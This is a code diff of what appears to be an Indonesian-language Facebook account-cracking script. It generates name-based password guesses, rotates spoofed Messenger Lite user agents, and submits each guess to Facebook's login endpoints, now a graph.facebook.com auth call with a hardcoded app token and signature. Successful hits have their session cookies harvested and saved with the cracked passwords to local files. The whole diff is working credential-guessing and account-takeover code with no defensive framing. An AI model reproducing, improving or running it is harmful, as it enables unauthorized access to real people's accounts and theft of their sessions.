@@ -3,7 +3,6 @@ import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subproces
 from concurrent.futures import ThreadPoolExecutor
 from bs4 import BeautifulSoup as parser
 from datetime import date,datetime
-from time import time as mek
 from requests.exceptions import ConnectionError
 ses = requests.Session()
 
@@ -48,7 +47,7 @@ versi_app = str(random.randint(111111111,999999999))
 for z in range(200):
 	versi_android = str(random.randint(4,12))+".0.0"
 	versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
-	ua = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; LDN-L21 Build/HUAWEILDN-L21) [FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/155323366;FBDM/"+"{density=2.0,width=720,height=1360}"+";FBLC/en_US;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.mlite;FBDV/LDN-L21;FBSV/{versi_android};FBOP/19;FBCA/armeabi-v7a:armeabi;]"
+	ua = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; vivo 1606 Build/MMB29M) [FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/181448449;FBDM/"+"{density=1.5,width=540,height=960};"+"FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.mlite;FBDV/vivo 1606;FBSV/{versi_android};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
 #[FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{versi_app};FBCR/Airtel;FBMF/Facebook/lge;FBBD/FEVER;FBDV/FEVER;FBSV/{versi_android};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.75,width=1080,height=2179};FB_FW/1;])"
 	if ua in ugent:pass
 	else:ugent.append(ua)
@@ -427,7 +426,6 @@ class Crack:
 								pass 
 							else:
 								pwx.append(depan+"123")
-								pwx.append(depan+"1234")
 								pwx.append(depan+"12345")
 						else:
 							if len(depan)<3:
@@ -442,7 +440,6 @@ class Crack:
 								pwx.append(depan+belakang)
 							else:
 								pwx.append(depan+belakang)
-								pwx.append(belakang)
 								pwx.append(belakang+"123")
 								pwx.append(belakang+"1234")
 								pwx.append(belakang+"12345")
@@ -460,47 +457,27 @@ class Crack:
 			for pw in pwx:
 				pw = pw.lower()
 				ua = random.choice(ugent)
-				ses = requests.Session()
-				link = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
-
 				params = {
-                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
-                    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
-                    "try_number": "0",
-                    "unrecognized_tries": "0",
-                    "email": email,
-                    "prefill_contact_point": f"{email} {pw}",
-                    "prefill_source": "browser_dropdown",
-                    "prefill_type": "password",
-                    "first_prefill_source": "browser_dropdown",
-                    "first_prefill_type": "contact_point",
-                    "had_cp_prefilled": True,
-                    "had_password_prefilled": True,
-                    "is_smart_lock": False,
-                    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
-                    "bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
-                    "encpass": f"#PWD_BROWSER:0:{str(mek()).split('.')[0]}:{pw}",
-                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
-                    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
-                
-                 }
+					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
+					"sdk_version": {random.randint(1,26)}, 
+					"email": email,
+					"locale": "en_US",
+					"password": pw,
+					"sdk": "android",
+					"generate_session_cookies": "1",
+					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
+				}
 				headers = {
-					"Host": "m.facebook.com",
-                    "content-length": f"{str(len(params))}",
-                    "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
-                    "user-agent": ua,
-                    "content-type": "application/x-www-form-urlencoded",
-                    "accept": "*/*",
-                    "origin": "https://m.facebook.com",
-                    "x-requested-with": "mark.via.gp",
-                    "sec-fetch-site": "same-origin",
-                    "sec-fetch-mode": "cors",
-                    "sec-fetch-dest": "empty",
-                    "referer": "https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1",
-                    "accept-encoding": "gzip, deflate",
-                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
-                    }
-				post = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", params=params, headers=headers, allow_redirects=False)
+					"Host": "graph.facebook.com",
+					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
+					"x-fb-sim-hni": str(random.randint(20000, 40000)),
+					"x-fb-net-hni": str(random.randint(20000, 40000)),
+					"x-fb-connection-quality": "EXCELLENT",
+					"user-agent": ua,
+					"content-type": "application/x-www-form-urlencoded",
+					"x-fb-http-engine": "Liger"
+				}
+				post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
 				if "session_key" in post.text and "EAA" in post.text:
 					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
 					user = re.findall("c_user=(\d+)",coki)[0]
@@ -508,9 +485,9 @@ class Crack:
 						break
 					else:
 						self.ok.append(user)
-						tree = Tree("                                 ")
+						tree = Tree(" ",guide_style=f"{color_panel}")
 						tree.add(f"\r{H2}{user}|{pw}{P2} ")
-						tree.add(f"{H2}{coki}{P2}")
+						tree.add(Panel(f"{H2}{coki}{P2}",style=f"{color_panel}"))
 						prints(tree)
 						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{coki}\n")
 						break
@@ -520,7 +497,7 @@ class Crack:
 						break
 					else:
 						self.cp.append(user)
-						tree = Tree("                                 ")
+						tree = Tree(" ",guide_style=f"{color_panel}")
 						tree.add(f"\r{K2}{user}|{pw}{P2} ")
 						prints(tree)
 						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
@@ -602,11 +579,11 @@ class Lain:
 		for akun in totalhasil:
 			user = akun.split("|")[0]
 			pw = akun.split("|")[1]
-			tree = Tree(" ")
+			tree = Tree(" ",guide_style=f"{color_panel}")
 			if folder=="OK":
 				cookie = akun.split("|")[2]
 				tree.add(f"\r{H2}{user}|{pw}{P2} ")
-				tree.add(f"{H2}{cookie}{P2}")
+				tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
 			else:
 				tree.add(f"\r{K2}{user}|{pw}{P2} ")
 			prints(tree)
